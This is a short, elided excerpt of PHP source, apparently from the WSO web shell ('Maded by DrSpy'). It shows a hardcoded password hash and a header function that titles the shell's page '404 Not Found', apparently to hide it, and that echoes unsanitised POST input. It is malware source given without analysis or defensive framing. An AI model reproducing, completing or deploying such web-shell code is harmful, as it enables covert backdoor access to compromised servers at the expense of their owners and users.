...
/*Maded by DrSpy*/
$auth_pass = "c397253e1ed816c081452b1e5e5a8d25";
$color = "red";
...
function wsoHeader() {
	...
	global $color;
	echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . " - 404 Not Found". "</title>
<style>
